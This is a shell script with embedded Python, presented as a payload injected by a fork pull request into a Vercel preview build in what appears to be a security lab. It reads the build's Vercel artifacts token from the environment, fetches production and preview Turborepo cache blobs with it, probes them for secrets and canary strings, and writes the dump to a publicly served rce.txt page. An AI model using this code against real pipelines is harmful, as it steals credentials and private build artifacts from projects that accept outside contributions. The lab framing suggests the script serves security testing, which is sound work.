#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 14: round 13 pulled the two
# Turborepo cache blobs but could not decode them. Dump the bytes, look for
# readable strings, and try every decompressor the cell has.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== the two Turborepo cache blobs, raw =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, zlib, gzip, bz2, lzma, re, urllib.request as U
EP   = os.environ.get("VERCEL_API_ENDPOINT", "https://api.vercel.com")
TEAM = os.environ.get("VERCEL_ARTIFACTS_OWNER", "")
AT   = os.environ.get("VERCEL_ARTIFACTS_TOKEN", "")
Q    = "?teamId=" + TEAM

def get(url):
    h = {"Authorization": "Bearer " + AT}
    r = U.urlopen(U.Request(url, headers=h), timeout=8)
    ce = r.headers.get("content-encoding", "-")
    return r.status, r.read(), ce

def strings(b, n=6):
    return [s for s in re.findall(rb"[ -~]{%d,}" % n, b)][:20]

def tryall(b):
    out = []
    for name, fn in (("zlib", zlib.decompress), ("gzip", gzip.decompress),
                     ("bz2", bz2.decompress), ("lzma", lzma.decompress)):
        try:
            out.append((name, len(fn(b))))
        except Exception as e:
            out.append((name, "no"))
    return out

for key, note in [("44fef76b3198d815", "production"), ("d53e15d029696e78", "preview")]:
    code, body, ce = get(EP + "/v8/artifacts/" + key + Q)
    print("-- %s (%s): HTTP %s, %d bytes, content-encoding=%s" % (key, note, code, len(body), ce))
    print("   hex: %s" % body[:64].hex())
    print("   decoders: %s" % ", ".join("%s=%s" % t for t in tryall(body)))
    ss = strings(body)
    print("   readable strings: %s" % ", ".join(repr(s.decode("latin1"))[:40] for s in ss[:12]))
    for probe in (b"secret", b"PROD-ONLY", b"P-labcanary", b"out/", b".txt"):
        print("   contains %-12s %s" % (probe.decode(), probe in body))
    open("/tmp/blob-%s.bin" % key, "wb").write(body)
PYEOF
  echo "-- try the cell's own archive tools on the saved blob"
  for t in tar zstd gzip bzip2 xz unzip; do
    printf "   %s: " "$t"
    if command -v "$t" >/dev/null 2>&1; then
      "$t" -tf /tmp/blob-44fef76b3198d815.bin 2>&1 | head -4 | tr '\n' ' '
      echo
    else
      echo "not installed"
    fi
  done
} > "$F" 2>&1
sleep 2
cat "$F"
